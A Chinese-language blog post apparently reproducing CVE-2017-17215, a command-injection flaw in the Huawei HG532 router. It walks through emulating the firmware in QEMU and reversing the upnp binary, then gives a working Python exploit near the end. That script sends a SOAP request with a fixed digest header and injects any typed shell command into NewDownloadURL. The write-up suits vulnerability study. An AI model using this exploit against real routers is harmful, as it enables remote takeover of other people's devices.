---
title: 华为HG532远程代码执行漏洞复现
date: 2026-05-23 13:44:27
tags: ["IOT","CVE"]
categories: ["IOT"]
---

兜兜转转终于是上手开搞iot了。


## Description

1. 该远程命令执行漏洞存在于华为HG532路由器，由Check Point安全人员纰漏。
2. 华为设备中的TR-064实现通过37215端口（UPnP）暴露在广域网。
3. 从设备的upnp描述中有一个叫 `DeviceUpgrade` 的服务，该服务通过向 `/ctrlt/DeviceUpgrade_1`（称为controlURL）发送请求来执行固件升级。
4. 并通过两个元素 `NewStatusURL` 和 `NewDownloadURL` 执行。
5. 该漏洞允许远程管理员通过在 NewStatusURL 和 NewDownloadURL 中注入 shell 元字符“$（）”来执行任意命令。

这里有我找的一份固件，可以在这里下载：[click here](/HG532eV100R001C02B015_upgrade_main.bin)

## 开搞！

### 配置环境

> 真正的解决方案在这里，笔者最终还是去折腾网桥了（
>
> **1. 问题诊断**
>
> **根本原因**：网桥 `br0` 下缺少 `tap0` 接口。执行 `sudo brctl show br0` 只显示：
> ```
> bridge name    bridge id        STP enabled    interfaces
> br0            8000.9a6776f76b27    no         ens33
> ```
> 没有 `tap0`，导致 QEMU 虚拟网卡无法连接到网桥，宿主机与 QEMU 之间无法通信。
>
> **2. 解决方案**
>
> **第一步：创建并配置 tap0**
> ```bash
> sudo tunctl -t tap0 -u pwn        # 创建 tap0 设备
> sudo ip link set tap0 up          # 启用 tap0
> sudo brctl addif br0 tap0         # 将 tap0 加入网桥
> sudo brctl show br0               # 验证（现在应该看到 tap0）
> ```
> ```bash
> sudo qemu-system-mips \
>     -M malta \
>     -kernel vmlinux-2.6.32-5-4kc-malta \
>     -hda debian_squeeze_mips_standard.qcow2 \
>     -append "root=/dev/sda1 console=tty0" \
>     -net nic,macaddr=00:16:3e:00:00:01 \
>     -net tap,ifname=tap0,script=no,downscript=no \
>     -nographic
> ```
> 关键点：`-net tap,ifname=tap0,script=no,downscript=no` 明确指定使用已创建的 `tap0`。
>
> **在 QEMU 内配置 IP**
> ```bash
> ifconfig eth1 192.168.138.131 netmask 255.255.255.0 up
> route add default gw 192.168.138.1
> ping 192.168.138.130   # 验证连通性
> ```
>
> successed!
>
> ```
> 64 bytes from 192.168.138.130: icmp_req=1 ttl=64 time=5.06 ms
> 5 packets transmitted, 5 received, 0% packet loss
> ```
> 网络跑通后可以继续了
> ```bash
> cd /root/rootfs && chroot . sh
> ./bin/upnp &
> ./bin/mic &


然后是解包固件：

```bash
wn@pwn:~/Desktop/HUAWEI-HG532$ cd _HG532eV100R001C02B015_upgrade_main.bin.extracted/
pwn@pwn:~/Desktop/HUAWEI-HG532/_HG532eV100R001C02B015_upgrade_main.bin.extracted$ ls
180  180.7z  DC080.squashfs  squashfs-root
pwn@pwn:~/Desktop/HUAWEI-HG532/_HG532eV100R001C02B015_upgrade_main.bin.extracted$ 
```

下载qemu需要的文件：

```bash
cd ~/Desktop/HUAWEI-HG532/
wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-2.6.32-5-4kc-malta
wget https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2
```

启动：
```bash
#!/bin/bash
sudo qemu-system-mips \
    -M malta \
    -kernel vmlinux-2.6.32-5-4kc-malta \
    -hda debian_squeeze_mips_standard.qcow2 \
    -append "root=/dev/sda1 console=tty0" \
    -net user,hostfwd=tcp::37215-:37215,hostfwd=tcp::2222-:22 \
    -net nic,macaddr=00:16:3e:00:00:01 \
    -nographic
```

![登录 qemu](/images/iot-hg532/2.png)

打开另一个终端，拷贝固件文件系统：

```bash
# 确认文件系统位置
ls ~/Desktop/HUAWEI-HG532/_HG532eV100R001C02B015_upgrade_main.bin.extracted/squashfs-root/

# 拷贝到 qemu
scp -P 2222 -r ~/Desktop/HUAWEI-HG532/_HG532eV100R001C02B015_upgrade_main.bin.extracted/squashfs-root root@127.0.0.1:/root/
```

如果上述没有办法成功拷贝的话那就是网络配置出现了问题，现在我们来搞一下qemu里面的网络配置：

```bash
# 启用 eth1 并配置 IP
ip link set eth1 up
ip addr add 10.0.2.15/24 dev eth1
ip route add default via 10.0.2.2

# 验证配置
ip addr show eth1
ip route
```

然后在解包的目录下用python跑一个http-server然后在qemu中下载：

```bash
# 下载文件
wget http://10.0.2.2:8000/squashfs-root.tar.gz
```

> 这里又踩了一个坑，我们解压出来的`squashfs-root`目录是空的，这是因为这种文件还需要我们用unsquashfs去解压，但是华为可以改了格式，这里我们使用Firmware Mod Kit去解压

![Firmware extraction successful](/images/iot-hg532/3.png)

然后打包下载

![](/images/iot-hg532/4.png)


之后我们进到qemu所在窗口：

```bash
wget http://10.0.2.2:8000/rootfs.tar.gz
tar -xzf rootfs.tar.gz

cd rootfs
chroot . /bin/sh
./bin/upnp &
./bin/mic &
exit
```

![酱紫就成功啦！](/images/iot-hg532/5.png)

### 漏洞分析

我们可以在 `/firmware-mod-kit/fmk/rootfs/bin` 文件夹内找到存在漏洞的upnp二进制文件，并使用checksec upnp查看其信息：

```bash
pwn@pwn:~/Desktop/firmware-mod-kit/fmk/rootfs/bin$ checksec ./upnp
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/pwn/.cache/.pwntools-cache-3.10/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.15.0)
[!] Could not populate MIPS GOT: seek out of range
[!] Did not find any GOT entries
[*] '/home/pwn/Desktop/firmware-mod-kit/fmk/rootfs/bin/upnp'
    Arch:       mips-32-big
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
```

可以看到，这是一个32位大端序的mips架构下的二进制文件，并且没有开任何保护。

根据官方的漏洞报告，我们知道漏洞存在于 `/bin/upnp` 和 `/bin/mic`二进制文件中，先将其拖进IDA中进行逆向分析：

main函数里有对网络服务进行初始化的核心调用，跟进init函数，会发现里面是个循环，循环次数是第二个参数5，然后对m_astInetdApps数组中的每一项操作，跟进数组

![](/images/iot-hg532/7.png)

进来之后看到这里跑了一个Socket Server，根据Socket参数定义设想v16为IP地址，我们看看这个v16是怎么定义的：

![](/images/iot-hg532/8.png)

![](/images/iot-hg532/9.png)

我们这里来解释一下：

1. `v16 = v31;`：v31 是解析出的 IP 地址字符串
2. `if ( !v28 ) v16 = 0;`：0 = NULL = INADDR_ANY

而对应如下：

1. 配置字符串格式为 服务名|IP|端口|命令
2. v16 从解析出的 IP 字段赋值
3. 0 在 socket 编程中代表 INADDR_ANY（绑定所有接口）

由此我们可以得出：固件没有限制该服务只能绑定在内网接口（LAN 口），导致它绑定到 0.0.0.0（所有接口），从而暴露在广域网（WAN）侧，互联网上的攻击者可以直接向该端口发送特制的 SOAP 数据包，触发命令注入漏洞，实现远程代码执行。

接下来是具体存在漏洞的文件：

![](/images/iot-hg532/10.png)

在main函数中就可以看到server1监听37215端口，然后去看ATP_UPNP_Init这个upnp框架的初始化函数

![](/images/iot-hg532/11.png)

看到注册upnp设备和服务的函数，继续跟进，然后就能看到整个TR-064服务的服务注册与功能注册函数，然后跟进功能注册：

![](/images/iot-hg532/12.png)

从官方漏洞报告中我们得知id为21的action对应Upgrade，注册这个action的句柄是从 `v9 = ATP_UPnP_RegService(v33, "WANPPPConnection:1", "WanPppConn.xml", 3, 1, 0, &v34);` 处返回的。

之后一样跟进v66那个函数：

![](/images/iot-hg532/13.png)

通过前面一些不知何意味的条件之后就来到了 `g_astActionArray`

![](/images/iot-hg532/14.png)

跟进到这个函数地址：

![](/images/iot-hg532/15.png)

这就是DeviceUpgrade服务的action函数，它从 SOAP 请求中提取 NewDownloadURL/NewStatusURL 参数，没有任何过滤，直接拼接后（因为;会连接两个独立语句）通过 system() 执行，导致RCE了。


### Exploit

```python
import requests

Authorization = "Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"
headers = {"Authorization": Authorization}

print("-----CVE-2017-17215 HUAWEI HG532 RCE-----\n")
cmd = input("command > ")

data = f'''
<?xml version="1.0" ?>
<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
    <s:Body>
        <u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
            <NewStatusURL>;mkdir lontan0;</NewStatusURL>
            <NewDownloadURL>;{cmd};</NewDownloadURL>
        </u:Upgrade>
    </s:Body>
</s:Envelope>
'''

r = requests.post('http://192.168.138.131:37215/ctrlt/DeviceUpgrade_1', headers = headers, data = data)
print("\nstatus_code: " + str(r.status_code))
print("\n" + r.text)
```

![成功exploit](/images/iot-hg532/6.png)


## References

- https://xz.aliyun.com/news/90989
- https://wsxk.github.io/IotVulhub/#1-vivotek
- https://www.cnblogs.com/cosyQAQ/p/19049647
- https://www.iotsec-zone.com/article/384#%E5%8D%8E%E4%B8%BAhg532%E8%B7%AF%E7%94%B1%E5%99%A8rce%E6%BC%8F%E6%B4%9E